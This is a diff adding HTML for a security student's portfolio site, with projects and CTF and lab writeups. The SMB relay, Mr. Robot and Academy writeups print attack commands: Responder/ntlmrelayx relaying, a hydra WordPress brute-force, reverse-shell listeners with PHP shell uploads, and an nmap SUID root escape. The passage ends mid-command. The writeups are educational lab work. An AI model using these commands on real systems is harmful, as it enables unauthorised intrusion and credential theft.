+        <div class="arow"><span class="akey">GitHub</span><span class="aval"><a href="https://github.com/JAIMNBIDU" target="_blank" rel="noopener noreferrer">JAIMNBIDU</a></span></div>
+        <div class="arow"><span class="akey">LinkedIn</span><span class="aval"><a href="https://www.linkedin.com/in/aryan-workofficial/" target="_blank" rel="noopener noreferrer">aryan-workofficial</a></span></div>
+        <div class="arow"><span class="akey">Status</span><span class="aval">Open — reach out</span></div>
+      </div>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+</div>
+
+<!-- ════ SKILLS ════ -->
+<div class="page" id="page-skills">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">02 — <b>Arsenal</b></div><h2 class="sec-title">What's loaded.</h2><p class="sec-lead">Depth where it's earned, honesty where it isn't. The detection-and-tooling stack is where I'm genuinely uncommon; the offensive side is solid and lab-proven; cloud is on the bench and labelled as such.</p></div>
+    <div class="sk-grid">
+      <div class="skblock reveal"><div class="sk-n">01</div><h3 class="sk-t">Detection &amp; Defense</h3><div class="tags"><span class="tag hl">Wazuh SIEM</span><span class="tag">Custom Rules</span><span class="tag">Alert Tuning</span><span class="tag">Log Analysis</span><span class="tag">ATT&amp;CK Mapping</span><span class="tag">IR</span></div><p class="sk-note">Where the signal lives — and where I'm strongest. I write detections against attacks I've personally executed, tune thresholds to kill false positives, and map every rule to a MITRE technique so an analyst knows what it's catching and why.</p></div>
+      <div class="skblock reveal"><div class="sk-n">02</div><h3 class="sk-t">Tooling &amp; Dev</h3><div class="tags"><span class="tag hl">Python</span><span class="tag">FastAPI</span><span class="tag">React</span><span class="tag">async httpx</span><span class="tag">Bash</span><span class="tag">REST</span><span class="tag">Git</span></div><p class="sk-note">Production instincts in side-project clothing: concurrency with fcntl locking and async httpx, supply-chain hygiene (pinned versions, HTTPS-enforced sources), least-privilege and server-side secret isolation built in from the first commit, not bolted on later.</p></div>
+      <div class="skblock reveal"><div class="sk-n">03</div><h3 class="sk-t">Offensive Security</h3><div class="tags"><span class="tag hl">BloodHound</span><span class="tag">Impacket</span><span class="tag">NetExec</span><span class="tag">Metasploit</span><span class="tag">Burp Suite</span><span class="tag">Nmap</span></div><p class="sk-note">Kerberoasting, AS-REP roasting, SMB relay, lateral movement, privilege escalation — the canonical AD chain, run by hand against a lab I built to be beaten. Foundational and real; its highest value is as the generator for everything in column 01.</p></div>
+      <div class="skblock reveal"><div class="sk-n">04</div><h3 class="sk-t">Infra &amp; Network</h3><div class="tags"><span class="tag hl">Proxmox</span><span class="tag">VMware</span><span class="tag">Docker</span><span class="tag">Windows Server</span><span class="tag">Active Directory</span><span class="tag">Wireshark</span></div><p class="sk-note">Whole environments from bare metal: hypervisor, domain (AD DS / DNS / DHCP / GPO), isolated VLANs, packet capture. TCP/IP and subnetting at the level where Wireshark is a reflex. Currently sharpening: cloud (Azure fundamentals) and the PNPT.</p></div>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+</div>
+
+<!-- ════ PROJECTS ════ -->
+<div class="page" id="page-projects">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">03 — <b>Work</b></div><h2 class="sec-title">Shipped &amp; running.</h2></div>
+    <div class="pcard reveal">
+      <div class="pcard-top"><span class="ptype">Threat Intelligence Platform</span><span class="pstatus">Active · 2026</span></div>
+      <h3 class="ptitle">ThreatLens</h3>
+      <p class="pdesc">Full-stack IOC enrichment platform (FastAPI + React/Vite) that queries VirusTotal, AbuseIPDB and Shodan concurrently, then turns three noisy feeds into one defensible risk number. Not a list of CVEs — a ranked answer to "which of these actually matters right now?"</p>
+      <ul class="pbullets"><li>Async httpx enrichment, server-side API-key isolation</li><li>Weighted, time-decayed risk scoring — 30-day half-life</li><li>IOC clustering via Jaccard similarity (threshold 0.65)</li><li>JSON / CSV export, prioritized by real risk not raw CVSS</li></ul>
+      <p class="pwhy"><b>Why it matters</b>Taking a fuzzy question — "how dangerous is this indicator, and which ones are related?" — and committing to a concrete, defensible model is data-modeling judgment, not API plumbing. This is the single artifact that maps most directly onto a threat-intel or detection-pipeline role.</p>
+      <div class="risk">
+        <p class="risk-h">Live demo — the <b>time-decay model</b> behind ThreatLens. Drag to age an indicator.</p>
+        <div class="risk-row">
+          <div class="risk-control"><label>Days since last seen <b><span id="risk-days">0</span>d</b></label><input type="range" id="risk-slider" min="0" max="90" value="0" aria-label="days since indicator last seen"><div class="risk-bar"><i id="risk-fill" style="width:100%"></i></div></div>
+          <div class="risk-score"><div class="num" id="risk-num">100</div><div class="lab">Risk score</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="pcard reveal">
+      <div class="pcard-top"><span class="ptype">Deployment Automation</span><span class="pstatus">Released · v2.0.0</span></div>
+      <h3 class="ptitle">ClassroomEnv</h3>
+      <p class="pdesc">A 1,400-line Python framework that standardizes Kali Linux training environments — 60+ tools across 8 profiles, identical across an entire room. Engineering rigor most people leave out of a "setup script".</p>
+      <ul class="pbullets"><li>Declarative tool registry, recursive DFS dependency resolution</li><li>fcntl exclusive locking against concurrent-run races</li><li>HTTPS-enforced apt sources, pinned version constraints</li><li>Hypervisor auto-detect (dmidecode), root-only JSON inventory</li></ul>
+      <p class="pwhy"><b>Why it matters</b>Nobody writes a 1,400-line framework with concurrency safety, supply-chain hygiene and least-privilege unless those instincts are real. Those usually show up two or three years into a working engineering job — here they're in a third-year side project.</p>
+    </div>
+    <div class="pcard reveal">
+      <div class="pcard-top"><span class="ptype">SIEM / Detection Engineering</span><span class="pstatus">Ongoing · 2025</span></div>
+      <h3 class="ptitle">Wazuh Detection Lab</h3>
+      <p class="pdesc">Self-hosted Wazuh SIEM with endpoint agents across the lab. The point isn't the install — it's that every attack I run becomes a detection I write. This is the loop most students never close.</p>
+      <ul class="pbullets"><li>Custom detection rules tuned to executed offensive scenarios</li><li>Alert thresholds + cross-dashboard event correlation</li><li>Mapped to MITRE ATT&amp;CK technique IDs</li><li>Fed directly by the AD attack lab below</li></ul>
+      <p class="pwhy"><b>Why it matters</b>This closes the loop most students never reach: attack, then write the detection for the attack you just ran. Purple teaming in everything but name — and the clearest signal of where my career actually points.</p>
+    </div>
+    <div class="pcard reveal">
+      <div class="pcard-top"><span class="ptype">Offensive Lab</span><span class="pstatus">Ongoing · 2025</span></div>
+      <h3 class="ptitle">Enterprise AD Attack Lab</h3>
+      <p class="pdesc">Four-machine virtualized Active Directory environment — DC, two Windows clients, Kali attacker — provisioned to mirror enterprise conditions, then run through the canonical attack chains. Its real value: it generates the detection content.</p>
+      <ul class="pbullets"><li>AD DS, DNS, DHCP, GPOs, OUs, user provisioning</li><li>SMB Relay, Kerberoasting, AS-REP Roasting</li><li>Lateral movement + privilege escalation</li><li>BloodHound · Impacket · NetExec</li></ul>
+    </div>
+    <div class="pcard reveal">
+      <div class="pcard-top"><span class="ptype">Freelance Engagements</span><span class="pstatus">Delivered · 2025</span></div>
+      <h3 class="ptitle">Vulnerability Assessments</h3>
+      <p class="pdesc">Three independent clients. Attack-surface mapping and OSINT, turned into remediation reports an engineer can act on and a manager can understand.</p>
+      <ul class="pbullets"><li>Prioritized findings, not a raw CVE dump</li><li>Reports written for non-technical stakeholders</li><li>OSINT profiling of public-facing exposure</li><li>All scope confidential — NDA by default</li></ul>
+    </div>
+    <div class="page-nav" data-pagenav></div>
+  </div>
+</div>
+
+<!-- ════ WRITEUPS ════ -->
+<div class="page" id="page-writeups">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">04 — <b>Writeups</b></div><h2 class="sec-title">Attack, then detect.</h2><p class="sec-lead">Every walkthrough ends where the real work begins — the detection and mitigation. Knowing how to run the attack is table stakes; knowing how to stop it is the job.</p></div>
+    <div id="wu-list">
+      <button class="wu-row" data-wu="classroomenv"><span class="wu-date">Jun 2026</span><span class="wu-ttl">ClassroomEnv — Build &amp; Debugging</span><span class="wu-tag">Tooling</span></button>
+      <button class="wu-row" data-wu="threatlens"><span class="wu-date">Jun 2026</span><span class="wu-ttl">ThreatLens — Threat Intelligence Platform</span><span class="wu-tag">Tooling</span></button>
+      <button class="wu-row" data-wu="academy"><span class="wu-date">Feb 2026</span><span class="wu-ttl">Academy — Credential Exposure to Root</span><span class="wu-tag">HackTheBox</span></button>
+      <button class="wu-row" data-wu="blue"><span class="wu-date">Feb 2026</span><span class="wu-ttl">Blue — EternalBlue by Hand</span><span class="wu-tag">HackTheBox</span></button>
+      <button class="wu-row" data-wu="kioptrix"><span class="wu-date">Jan 2026</span><span class="wu-ttl">Kioptrix — SMB to Root via trans2open</span><span class="wu-tag">VulnHub</span></button>
+      <button class="wu-row" data-wu="vulnhub-lab"><span class="wu-date">Jun 2025</span><span class="wu-ttl">Building a Virtual Hacking Lab</span><span class="wu-tag">Lab Setup</span></button>
+      <button class="wu-row" data-wu="smb-relay"><span class="wu-date">May 2025</span><span class="wu-ttl">SMB Relay in Practice</span><span class="wu-tag">Active Directory</span></button>
+      <button class="wu-row" data-wu="mr-robot"><span class="wu-date">Apr 2025</span><span class="wu-ttl">Mr. Robot — Wordlist Warfare</span><span class="wu-tag">VulnHub</span></button>
+    </div>
+    <div id="wu-detail">
+      <button class="wu-back" id="wu-back-btn">Back to writeups</button>
+      <article class="wu-article" id="article-classroomenv"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Jun 2026</span><span>Tooling · DevOps</span></div>
+        <h1 class="wu-article-title">ClassroomEnv — Build &amp; Debugging Writeup</h1>
+        <div class="wu-body">
+          <h2>The problem</h2>
+          <p>I run informal cybersecurity sessions for people entering the field. The recurring failure wasn't the teaching material — it was the environment. Participants arrived with different hypervisors, different Kali releases, pre-existing installs with arbitrary tool versions, and broken repositories. A large fraction of every session went to debugging other people's operating systems rather than teaching.</p>
+          <p>The obvious fix — <a href="https://github.com/Dewalt-arch/pimpmykali" target="_blank" rel="noopener noreferrer">PimpMyKali</a> — repairs a broken Kali well, but it installs broadly. For a beginner session that's the wrong shape: it pulls in advanced tooling a first session has no use for, and it takes a long time. What a session actually needs is narrow and predictable.</p>
+
+          <h2>The design</h2>
+          <p>ClassroomEnv is a single Python script plus a set of Docker images built around three ideas:</p>
+          <p><strong>Profiles.</strong> Tools are grouped into domain profiles — <code>core</code>, <code>web</code>, <code>osint</code>, <code>ad</code>, <code>wireless</code>, <code>exploitation</code>, <code>extras</code>, and <code>full</code>. You install only what a session needs. Advanced material is opt-in, never forced on a beginner.</p>
+          <p><strong>A registry as the single source of truth.</strong> Every tool is one entry in a <code>REGISTRY</code> dict: installer, package name, binary name, version detection, minimum-version floor. Profiles are just lists of registry keys. Everything else reads from that one structure — no second list to drift out of sync.</p>
+          <p><strong>Installer routing.</strong> Each tool declares its installer: <code>apt</code> for the default prebuilt path, <code>pipx</code> for Python application tools in isolated virtualenvs, <code>go</code> for tools not reliably packaged anywhere else.</p>
+          <p><strong>Two layers, two guarantees.</strong> The script standardizes the toolset. The Docker images freeze it — <code>docker pull</code> gives everyone a byte-for-byte identical environment. The script standardizes; the images reproduce.</p>
+
+          <h2>The debugging — where the real work was</h2>
+          <p>The design was straightforward. The value was in everything that broke when the script ran against an actual Kali system.</p>
+
+          <h3>3.1 — The verify check had no discriminating power</h3>
+          <p><strong>Symptom:</strong> A fresh, healthy install showed nine tools as <code>MISMATCH</code> — nmap, git, curl, wget, python3, pip, tmux, jq, vim — every single run.</p>
+          <p><strong>Cause:</strong> Version comparison used <code>found.startswith(pinned)</code>. <code>"7.98"</code> doesn't start with <code>"7.94"</code>, so every tool that received a routine update since the pins were set failed. The pins were a frozen snapshot of a moving target.</p>
+          <p><strong>Fix:</strong> Replaced the prefix match with a numeric, component-wise floor comparison: parse both versions into integer lists, zero-pad, compare. <code>8.18.0 &gt;= 7.80</code> passes; a genuine regression like <code>7.50 &lt; 7.90</code> fails. The check now means something.</p>
+
+          <h3>3.2 — <code>go install</code> was the wrong installer for ProjectDiscovery tools</h3>
+          <p><strong>Symptom:</strong> <code>subfinder</code> triggered a multi-minute source build. <code>dnsx</code> failed outright: the <code>go.mod</code> file contained <code>replace</code> directives that <code>go install</code> refuses by design.</p>
+          <p><strong>Cause:</strong> The registry routed httpx, nuclei, subfinder, and dnsx through <code>go install pkg@version</code> — slow, network-heavy, and hitting Go module constraints on every machine identically.</p>
+          <p><strong>Fix:</strong> All four are in Kali's apt repositories as prebuilt binaries. Flipped them from <code>go</code> to <code>apt</code>. Only <code>kerbrute</code> stays on <code>go</code> — it isn't reliably packaged, and Go modules pin its version via <code>@v1.0.3</code>.</p>
+
+          <h3>3.3 — <code>pip install</code> refused on modern Kali (PEP 668)</h3>
+          <p><strong>Symptom:</strong> <code>error: externally-managed-environment</code> on every pip-based tool.</p>
+          <p><strong>Cause:</strong> Kali (Python 3.12+) marks the system Python as externally managed. System-wide <code>pip install</code> is refused by design.</p>
+          <p><strong>Fix:</strong> Switched pip tools to <strong>pipx</strong> — installs each tool into its own isolated virtualenv and links the binary onto <code>PATH</code>. The <code>--break-system-packages</code> shortcut was deliberately rejected: it does exactly what the error warns against.</p>
+
+          <h3>3.4 — pipx tools crashed on <code>pkg_resources</code></h3>
+          <p><strong>Symptom:</strong> After installing via pipx, <code>shodan version</code> threw <code>ModuleNotFoundError: No module named 'pkg_resources'</code>.</p>
+          <p><strong>Cause:</strong> Python 3.12+ no longer ships <code>setuptools</code>/<code>pkg_resources</code> by default. Injecting bare <code>setuptools</code> didn't help — it pulled setuptools 82, and setuptools 81 removed <code>pkg_resources</code> entirely.</p>
+          <p><strong>Fix:</strong> Inject <code>setuptools&lt;81</code> into each pipx venv — the last version that still ships <code>pkg_resources</code>. Confirmed by downgrading a live venv from 82.0.1 to 80.10.2, after which <code>shodan version</code> returned <code>1.31.0</code> cleanly.</p>
+
+          <h3>3.5 — A stray apt copy shadowed the working pipx tool</h3>
+          <p><strong>Symptom:</strong> Even after the <code>setuptools&lt;81</code> fix, shodan still crashed — traceback pointed at <code>/usr/bin/shodan</code>, an apt copy.</p>
+          <p><strong>Cause:</strong> Something pulled <code>python3-shodan</code> as a dependency. The script's detection used <code>shutil.which("shodan")</code>, found the broken apt copy on <code>PATH</code>, declared it already installed, and skipped the pipx install entirely.</p>
+          <p><strong>Fix:</strong> For pipx tools, detection now checks <code>/usr/local/bin/&lt;tool&gt;</code> specifically — not anywhere on <code>PATH</code>. Since <code>/usr/local/bin</code> precedes <code>/usr/bin</code> on the standard Kali <code>PATH</code>, the pipx copy wins at runtime.</p>
+
+          <h3>3.6 — httpx is not called <code>httpx</code> on Kali</h3>
+          <p><strong>Symptom:</strong> <code>httpx -version</code> → <code>command not found</code>, even after a reported successful build.</p>
+          <p><strong>Cause:</strong> Kali packages ProjectDiscovery's httpx as <code>httpx-toolkit</code> — both the package name and the binary — because the bare name <code>httpx</code> is already owned by <code>python3-httpx</code>.</p>
+          <p><strong>Fix:</strong> Set both <code>bin</code> and <code>version_cmd</code> to <code>httpx-toolkit</code>. This collision is unique to httpx — subfinder, nuclei, and dnsx keep their normal names.</p>
+
+          <h3>3.7 — pwncat-cs is abandoned</h3>
+          <p><strong>Symptom:</strong> Persistent install failure after all other fixes.</p>
+          <p><strong>Cause:</strong> pwncat-cs is no longer maintained and breaks on Python 3.12+. The upstream workaround requires a separately-provided Python 3.11 — which Kali doesn't ship by default.</p>
+          <p><strong>Decision:</strong> Dropped it. A post-exploitation framework is advanced-profile material anyway. A tool that needs a Python downgrade is a liability in a training environment, not an asset.</p>
+
+          <h3>3.8 — The Windows line-ending shebang failure</h3>
+          <p><strong>Symptom:</strong> <code>./classroomenv.py</code> → <code>'python3\r': No such file or directory</code>.</p>
+          <p><strong>Cause:</strong> The file passed through Windows and picked up CRLF line endings. The shebang became <code>#!/usr/bin/env python3\r</code> — the kernel looked for an interpreter literally named <code>python3\r</code>.</p>
+          <p><strong>Fix:</strong> Two layers. Ship LF-only. Add <code>.gitattributes</code> with <code>* text=auto eol=lf</code> to force Unix line endings on checkout for everyone who clones the repo regardless of OS.</p>
+
+          <h3>3.9 — Docker layer caching hid fixes</h3>
+          <p><strong>Symptom:</strong> After editing the script and rebuilding a profile image, the bug persisted — build finished in 0.2 seconds, every step marked <code>CACHED</code>.</p>
+          <p><strong>Cause:</strong> The script is <code>COPY</code>'d into the core image, and profile images build <code>FROM classroomenv:core</code>. Editing the script doesn't touch anything the profile Dockerfile sees, so Docker reused cached layers.</p>
+          <p><strong>Fix:</strong> Any change to the script requires rebuilding <code>core</code> with <code>--no-cache</code> first, then the profile images. Documented in the README so it isn't rediscovered the hard way.</p>
+
+          <h2>Tool outcome summary</h2>
+          <pre>httpx                        Fixed — invoked as httpx-toolkit
+subfinder / nuclei / dnsx    Fixed — moved from go install to apt
+shodan / ldapdomaindump /
+  volatility3                Fixed — pipx + setuptools&lt;81
+kerbrute                     Works — Go install, version-pinned
+crackmapexec                 Works
+radare2, amass               Never broken — earlier errors cosmetic
+pwncat-cs                    Removed — abandoned, Python 3.12 incompatible
+Metasploit, john, hydra,
+  the rest                   Build and run clean</pre>
+
+          <h2>What this project is, honestly</h2>
+          <p>It is not a novel idea. Install-scripts and metapackages for Kali already exist. Its value isn't innovation — it's a focused tool scoped to a real problem, and engineering judgment in the integration: correct installer routing, honest version semantics, isolated Python environments, a reproducible Docker layer, and a registry design that keeps one source of truth.</p>
+          <p>The work that made it actually function was not the design. It was the long tail of OS-level integration problems above — apt package renames, Python packaging breakage, Go module constraints, PATH shadowing, line endings, Docker caching. That's the difference between code that exists and a tool that survives contact with a real machine.</p>
+
+          <h2>What's next</h2>
+          <p>The natural extension isn't more tools or more profiles — that's just width. It's pairing the offensive profiles with the detection side: an attack scenario alongside the detection rules that catch it. An install-script that also teaches what attacks look like from the defender's seat would be genuinely differentiated, rather than a cleaner version of something that already exists.</p>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-vulnhub-lab"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Jun 2025</span><span>Lab Setup</span></div>
+        <h1 class="wu-article-title">Building a Virtual Hacking Lab</h1>
+        <div class="wu-body">
+          <h2>Why a local lab?</h2>
+          <p>Every time I spun up a cloud VM for practice, something felt wrong — the latency, the shared hardware, the dependency on someone else's infrastructure. A local lab removes all of that. You own the network, the machines, the environment.</p>
+          <p><strong>The goal: a fully isolated environment where I can practice offensive techniques without restraint, consequence, or connectivity to anything real.</strong></p>
+          <h3>Infrastructure</h3>
+          <pre>Host:       Proxmox VE 8.x
+Network:    Isolated host-only VLAN
+Attack box: Kali Linux
+Targets:    VulnHub OVAs + Windows Server (AD lab)</pre>
+          <h2>Academy (HackTheBox)</h2>
+          <p>Classic web-exploitation entry point: PHP file-upload bypass, path traversal to find credentials, priv-esc via misconfigured sudo. The lesson — enumerate slowly, don't jump to the first foothold.</p>
+          <h2>Blue (HackTheBox)</h2>
+          <p>EternalBlue. Running it manually instead of through a Metasploit one-liner forces you to understand what the exploit is doing at the packet level. Wireshark open the entire time.</p>
+          <h2>Mr. Robot (VulnHub)</h2>
+          <p>Three keys hidden across the system, each requiring a different mode of thinking. The WordPress dictionary attack with the show's own wordlist was elegant — the answer was in the source material the whole time.</p>
+          <h3>What a lab teaches that CTFs don't</h3>
+          <p>CTF machines are designed to be solved. Real environments are designed to work. Building and breaking your own lab forces you to think about both sides simultaneously. When I misconfigure something in my AD lab and then find it through BloodHound, I understand the misconfiguration in a way reading about it never produces.</p>
+          <p>The lab is permanent — not a challenge I complete and move on from, but a living environment I keep modifying, breaking, and defending.</p>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-smb-relay"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>May 2025</span><span>Active Directory</span></div>
+        <h1 class="wu-article-title">SMB Relay in Practice: Setup to Domain Compromise</h1>
+        <div class="wu-body">
+          <h2>What is an SMB relay attack?</h2>
+          <p>When a Windows machine authenticates to a network share, it sends an NTLM challenge. If SMB signing isn't enforced, an attacker positioned between client and server can relay that authentication to another machine and authenticate as the victim — without ever cracking the hash.</p>
+          <p><strong>The attack doesn't need credentials. It needs position and an unsigned SMB environment</strong> — which, in most enterprise networks, is exactly what you have.</p>
+          <h3>Lab setup</h3>
+          <pre>Domain Controller: Windows Server 2019 (192.168.10.5)
+Workstation 1:    Windows 10 (192.168.10.10) — victim
+Attack box:       Kali Linux (192.168.10.99)
+Tools:            Responder + ntlmrelayx (Impacket)</pre>
+          <h2>Step 1 — Confirm SMB signing is off</h2>
+          <pre>netexec smb 192.168.10.0/24 --gen-relay-list targets.txt</pre>
+          <h2>Step 2 — Position and listen</h2>
+          <p>Responder poisons LLMNR/NBT-NS queries. We turn its own SMB/HTTP servers off because we want to relay, not capture.</p>
+          <pre># responder.conf: SMB = Off, HTTP = Off
+responder -I eth0 -rdw</pre>
+          <h2>Step 3 — Relay</h2>
+          <pre>ntlmrelayx.py -tf targets.txt -smb2support
+# SAM dump happens automatically if victim is local admin</pre>
+          <h3>Detection &amp; mitigation</h3>
+          <p>This is the part that matters. Knowing how to run the attack is table stakes. Knowing how to stop it is the work:</p>
+          <ul><li>Enforce SMB signing domain-wide via GPO — removes the relay surface entirely</li><li>Disable LLMNR and NetBIOS-NS — eliminates the poisoning vector</li><li>Monitor for Responder-shaped traffic: anomalous LLMNR responses</li><li>Tier admin accounts — local admin reuse amplifies every relay attack</li></ul>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-mr-robot"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Apr 2025</span><span>VulnHub</span></div>
+        <h1 class="wu-article-title">Mr. Robot — Wordlist Warfare &amp; Privilege Escalation</h1>
+        <div class="wu-body">
+          <h2>The machine</h2>
+          <p>Mr. Robot is a VulnHub machine themed around the show. Three keys at different privilege levels. Web-first, pivots into WordPress exploitation, ends with a classic priv-esc. What makes it memorable: <strong>the answers are in the show itself.</strong></p>
+          <h3>Enumeration</h3>
+          <pre>nmap -sV -sC -oN nmap_initial &lt;target&gt;
+# Open: 80 (HTTP), 443 (HTTPS), 22 (filtered)
+
+ffuf -w directory-list-2.3-medium.txt -u http://target/FUZZ -mc 200,301
+# Found: /wp-login, /robots.txt, /license</pre>
+          <h2>Key 1 — robots.txt</h2>
+          <p>Two entries: a path to the first key, and the show's character wordlist — <code>fsocity.dic</code>, 858,000 entries with heavy duplication.</p>
+          <pre>sort -u fsocity.dic &gt; fsocity_clean.dic
+# 858,160 -> 11,451 unique entries</pre>
+          <h2>WordPress bruteforce</h2>
+          <p>Username enumeration via the login error message surfaces <strong>Elliot</strong>. Then hydra with the cleaned wordlist:</p>
+          <pre>hydra -l Elliot -P fsocity_clean.dic target http-post-form \
+  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:ERROR" -t 20</pre>
+          <h2>Reverse shell via theme editor</h2>
+          <pre>nc -lvnp 4444
+# Appearance -> Theme Editor -> 404.php (PHP reverse shell)
+# www-data shell</pre>
+          <h2>Key 3 — root via nmap SUID</h2>
+          <pre>find / -perm -4000 2>/dev/null | grep nmap
+nmap --interactive
+!sh
+# root shell</pre>
+          <h3>The lesson</h3>
+          <p>The wordlist being on the machine itself is the best lesson. <strong>Attackers use your own data against you.</strong> The enumeration phase exists precisely because targets leave more exposed than they realise.</p>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-threatlens"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Jun 2026</span><span>Tooling · Threat Intelligence</span></div>
+        <h1 class="wu-article-title">ThreatLens — Threat Intelligence Aggregation Platform</h1>
+        <div class="wu-body">
+          <h2>The problem</h2>
+          <p>Security analysts investigating suspicious indicators — IPs, domains, hashes, URLs — work across multiple platforms by default. VirusTotal for detection ratios. AbuseIPDB for abuse confidence. Shodan for infrastructure exposure. Each platform answers a different question, uses a different confidence model, and treats a threat last seen six months ago the same way it treats one from yesterday.</p>
+          <p>The result: fragmented signal, manual correlation, and risk assessments that vary depending on which analyst ran which query in which order. ThreatLens collapses that workflow into a single enrichment pipeline and produces a normalized, time-sensitive risk score instead of three separate read-outs.</p>
+
+          <h2>Architecture</h2>
+          <pre>React Frontend (Vite)
+        │
+        │  HTTP — localhost:8000
+        ▼
+FastAPI Backend (Python 3.11+)
+        │
+        ├──▶ VirusTotal API    (detections, categories, CVEs, PoC flags)
+        ├──▶ AbuseIPDB API     (abuse score, reports, ISP, TOR identification)
+        └──▶ Shodan API        (open ports, CVEs with CVSS, service banners)</pre>
+          <p>All three source queries execute asynchronously via <code>httpx</code>. A semaphore caps concurrent enrichment at 5 IOCs simultaneously — enough to keep latency low without burning free-tier API quotas on large batches. API keys live server-side only. The browser never sees them.</p>
+
+          <h2>The pipeline</h2>
+          <p>ThreatLens accepts batches of up to 50 IOCs and runs them through six stages in sequence:</p>
+          <p><strong>Classification → Enrichment → Behavioral Extraction → Risk Scoring → Temporal Decay → Clustering</strong></p>
+          <p>The output is not raw API data forwarded to the frontend. Each IOC exits the pipeline with a decayed risk score, a severity classification, a normalized tag set, and cluster membership identifying indicators with similar behavioral profiles.</p>
+
+          <h2>Engineering decisions</h2>
+          <h3>Why weighted scoring</h3>
+          <p>Each provider answers a different question. VirusTotal's detection ratio reflects AV engine consensus. AbuseIPDB's confidence score reflects distinct user reports of abuse. Shodan reflects infrastructure exposure state. Combining them without weighting produces noise — a Shodan-heavy score penalizes a cleanly-used server with open ports while missing a zero-detection phishing domain entirely.</p>
+          <p>Current weighting: VirusTotal at 45%, AbuseIPDB at 35%, Shodan at 20%. This reflects the operational priority of detection signal over exposure state. It is a deliberate assumption, not a calibrated measurement. The limitation is documented.</p>
+
+          <h3>Why temporal decay</h3>
+          <p>Threat intelligence degrades. An IP flagged for botnet activity eight months ago may be decommissioned, reassigned, or cleaned. Treating that historical signal with the same weight as a report from last week produces misleading severity classifications. ThreatLens applies a 30-day half-life exponential decay:</p>
+          <pre>decay_factor = e^(−ln2 × days_since_last_seen / 30)
+final_score  = raw_score × decay_factor</pre>
+          <p>At 30 days, a score carries 50% of its original weight. At 60 days, 25%. At 90 days, roughly 12.5%. The analyst-facing score is always the decayed value — not the raw one. Recently active threats surface above stale historical data without requiring manual recency filtering.</p>
+
+          <h3>Why behavioral tags instead of raw source output</h3>
+          <p>Raw source metadata is not comparable across IOCs. VirusTotal categories use vendor-defined strings. Shodan port data is numerical. AbuseIPDB metadata is structured differently still. ThreatLens converts source metadata into a normalized tag set — <code>ssh</code>, <code>rdp</code>, <code>smb</code>, <code>tor-exit</code>, <code>cve-present</code>, <code>high-abuse</code>, <code>mass-reported</code> — derived from actual signals rather than assigned manually. These tags are the input to clustering.</p>
+
+          <h3>Why Jaccard similarity for clustering</h3>
+          <p>Jaccard compares set overlap: <code>|tags_A ∩ tags_B| / |tags_A ∪ tags_B|</code>. It requires no feature vectors, no training data. For behavioral tag sets of the size ThreatLens produces, it is computationally trivial and produces interpretable results. IOCs with similarity ≥ 0.65 are placed in the same cluster. Known limitation: it compares against the first seed of each cluster rather than performing graph-based clustering — in larger datasets it will miss relationships. Appropriate for the 50-IOC request cap.</p>
+
+          <h2>Limitations</h2>
+          <p><strong>IOC validation is format-only.</strong> The IPv4 regex matches <code>999.999.999.999</code> — range validation is absent. <strong>Scoring weights are assumptions</strong>, not derived from historical incident data or analyst feedback. <strong>No persistence layer</strong> — results live in memory only; trend analysis requires an SQLite or PostgreSQL backend. <strong>CORS is open</strong> and authentication is absent — acceptable for local research, blockers before any public deployment.</p>
+
+          <h2>What this project actually is</h2>
+          <p>It is not a SIEM. It is not a full threat-intel platform. It is the answer to a specific question: given a batch of suspicious indicators, which ones matter right now and which are historical noise? The time-decay model is the part that earns its keep. Prioritized threat data without manual recency filtering is the difference between an analyst who triages efficiently and one who drowns in stale signals.</p>
+        </div>
+      </div></article>
+      <article class="wu-article" id="article-academy"><div class="wu-article-wrap">
+        <div class="wu-article-meta"><span>Feb 2026</span><span>HackTheBox</span></div>
+        <h1 class="wu-article-title">Academy — Credential Exposure to Root via Cron Hijack</h1>
+        <div class="wu-body">
+          <h2>The machine</h2>
+          <p>Academy is a HackTheBox machine that chains a series of low-friction misconfigurations: anonymous FTP exposing credentials, a PHP upload bypass for initial access, a poorly secured user account surfaced by privilege escalation tooling, and a cron-executed script with world-writable permissions. No single step is sophisticated. Together they produce root.</p>
+
+          <h3>Enumeration</h3>
+          <pre>nmap -sV -sC -oN nmap_academy &lt;target&gt;
+# Open: 21 (FTP — anonymous login allowed), 22 (SSH), 80 (HTTP)</pre>
+          <p>The scan returned three services. Anonymous FTP is the first flag worth pulling on — it almost always means something was left accessible by mistake.</p>
+
+          <h2>FTP — credentials in the open</h2>
+          <p>Connected anonymously. The server held a single file: <code>note.txt</code>. It contained login credentials with an MD5-hashed password. The service to authenticate against was not clear yet, but the credentials were noted — MD5 is trivially crackable if needed, but identifying the target came first.</p>
+
+          <h2>Subdomain discovery</h2>
+          <pre>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -u http://&lt;target&gt; -H "Host: FUZZ.academy.htb" -mc 200,301</pre>
+          <p>The FTP note implied a staging subdomain. ffuf surfaced it. The subdomain resolved to a login panel — the credentials from the FTP note authenticated without modification.</p>
+
+          <h2>Initial foothold — PHP upload bypass</h2>
+          <p>The authenticated panel included a profile photo upload field. The nmap scan confirmed PHP. Upload validation was client-side only — intercepting the request and changing the content type was enough to push a <code>shell.php</code>.</p>
+          <pre># pentestmonkey PHP reverse shell — edit before uploading:
+# $ip = '&lt;attacker-ip&gt;';
+# $port = 4444;
+
+nc -lvnp 4444
+# Upload shell.php via the profile photo field, trigger via browser</pre>
+          <p>Shell returned as <code>www-data</code>. Not root, but on the box.</p>
+
+          <h2>Privilege escalation — linpeas to credentials</h2>
+          <pre># Serve linpeas from the attack box:
+python3 -m http.server 8080
+
+# On the target:
